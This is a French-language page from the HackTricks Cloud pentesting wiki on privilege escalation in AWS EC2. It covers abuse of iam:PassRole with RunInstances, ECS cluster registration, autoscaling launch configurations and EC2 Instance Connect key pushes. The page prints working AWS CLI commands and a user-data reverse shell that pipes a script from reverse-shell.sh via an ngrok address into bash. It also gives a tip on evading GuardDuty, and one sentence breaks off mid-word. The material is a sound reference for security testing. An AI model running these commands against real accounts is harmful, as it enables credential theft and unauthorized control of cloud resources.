# AWS - EC2 Privesc

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## EC2

Pour plus d'**informations sur EC2**, consultez :

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

Un attaquant ayant les autorisations `iam:PassRole` et `ec2:RunInstances` peut **cr√©er une nouvelle instance EC2** √† laquelle il aura acc√®s au syst√®me d'exploitation et **passer un profil d'instance EC2 existant**. Il peut ensuite se connecter √† l'instance et **demander les cl√©s AWS associ√©es aux m√©tadonn√©es de l'instance EC2**, ce qui lui donne acc√®s √† toutes les autorisations que le profil d'instance/service associ√© a.

* **Acc√®s via SSH**

Vous pouvez ex√©cuter une nouvelle instance en utilisant une **cl√© ssh cr√©√©e** (`--key-name`) et ensuite ssh dedans (si vous voulez en cr√©er une nouvelle, vous pourriez avoir besoin de la permission `ec2:CreateKeyPair`).

```bash
aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
    --iam-instance-profile Name=iam-full-access-ip --key-name my_ssh_key \
    --security-group-ids sg-123456
```

* **Acc√®s via une reverse shell dans les donn√©es utilisateur**

Vous pouvez ex√©cuter une nouvelle instance en utilisant des **donn√©es utilisateur** (`--user-data`) qui vous enverront une **reverse shell**. Vous n'avez pas besoin de sp√©cifier de groupe de s√©curit√© de cette mani√®re.

```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id ami-0c1bc246476a5572b --instance-type t2.micro \
   --iam-instance-profile Name=EC2-CloudWatch-Agent-Role \
   --count 1 \
   --user-data "file:///tmp/rev.sh"
```

Une note importante √† faire √† propos de cette attaque est qu'un **indicateur √©vident de compromission** est lorsque les **informations d'identification du profil d'instance EC2 sont utilis√©es en dehors de l'instance sp√©cifique**. M√™me AWS GuardDuty d√©clenche cela (https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types.html#unauthorized11), il n'est donc pas judicieux d'extraire ces informations d'identification et de les ex√©cuter localement, mais plut√¥t **d'acc√©der √† l'API AWS depuis cette instance EC2**.

**Impact potentiel :** Privesc direct vers n'importe quel r√¥le EC2 attach√© √† des profils d'instance existants.

#### Privesc vers ECS

Avec cet ensemble d'autorisations, vous pouvez √©galement **cr√©er une instance EC2 et l'enregistrer dans un cluster ECS**. De cette fa√ßon, les **services ECS** seront **ex√©cut√©s** √† l'int√©rieur de l'**instance EC2** o√π vous avez acc√®s, puis vous pouvez p√©n√©trer dans ces services (conteneurs Docker) et **voler les r√¥les ECS qui y sont attach√©s**.

```bash
aws ec2 run-instances \
    --image-id ami-07fde2ae86109a2af \
    --instance-type t2.micro \
    --iam-instance-profile <ECS_role> \
    --count 1 --key-name pwned \
    --user-data "file:///tmp/asd.sh" 

# Assurez-vous d'utiliser une AMI optimis√©e pour ECS car elle a d√©j√† tout install√© pour ECS (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# Le profil d'instance EC2 a besoin d'un acc√®s ECS de base
# Le contenu des donn√©es utilisateur est :
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```

Pour apprendre comment **forcer les services ECS √† s'ex√©cuter** dans cette nouvelle instance EC2, consultez :

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

Si vous **ne pouvez pas cr√©er une nouvelle instance** mais avez la permission `ecs:Register
### `autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`

Un attaquant ayant les permissions **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** peut **cr√©er une configuration de lancement** avec un **r√¥le IAM** et un **shell invers√©** dans les **donn√©es utilisateur**, puis **cr√©er un groupe d'auto-scaling** √† partir de cette configuration et attendre que le shell invers√© **vole le r√¥le IAM**.

```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
   --launch-configuration-name bad_config \
   --image-id ami-0c1bc246476a5572b \
   --instance-type t3.micro \
   --iam-instance-profile EC2-CloudWatch-Agent-Role \
   --user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
   --auto-scaling-group-name bad_auto \
   --min-size 1 --max-size 1 \
   --launch-configuration-name bad_config \
   --desired-capacity 1 \
   --vpc-zone-identifier "subnet-e282f9b8"
```

**Impact potentiel:** Privil√®ge direct √† un r√¥le EC2 diff√©rent.

### `!autoscaling`

L'ensemble des permissions **`ec2:CreateLaunchTemplate`** et **`autoscaling:CreateAutoScalingGroup`** **ne suffisent pas √† l'escalade** des privil√®ges vers un r√¥le IAM car pour attacher le r√¥le sp√©cifi√© dans la configuration de lancement ou dans le mod√®le de lancement, **vous avez besoin des permissions `iam:PassRole` et `ec2:RunInstances`** (ce qui est une escalade de privil√®ges connue).

### `ec2-instance-connect:SendSSHPublicKey`

Un attaquant ayant la permission **`ec2-instance-connect:SendSSHPublicKey`** peut ajouter une cl√© ssh √† un utilisateur et l'utiliser pour y acc√©der (s'il a acc√®s ssh √† l'instance) ou pour escalader les privil√®ges.

```bash
aws ec2-instance-connect send-ssh-public-key \
   --instance-id "$INSTANCE_ID" \
   --instance-os-user "ec2-user" \
   --ssh-public-key "file://$PUBK_PATH"
```

**Impact potentiel:** Privil√®ge direct aux r√¥les IAM EC2 attach√©s aux instances en cours d'ex√©cution.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

Un attaquant ayant la permission **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** peut **ajouter une cl√© ssh √† une connexion s√©rie**. Si la s√©rie n'est pas activ√©e, l'attaquant a besoin de la permission **`ec2:EnableSerialConsoleAccess` pour l'activer**.

Pour se connecter au port s√©rie, vous devez √©galement **conna√Ætre le nom d'utilisateur et le mot de passe d'un utilisateur** √† l'int√©rieur de la machine.

```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
   --instance-id "$INSTANCE_ID" \
   --serial-port 0 \
   --region "eu-west-1" \
   --ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```

Cette m√©thode n'est pas tr√®s utile pour l'escalade de privil√®ges car vous devez conna√Ætre un nom d'utilisateur et un mot de passe pour l'exploiter.

**Impact potentiel:** (Tr√®s improbable) Privil√®ge direct aux r√¥les IAM EC2 attach√©s aux instances en cours d'ex√©cution.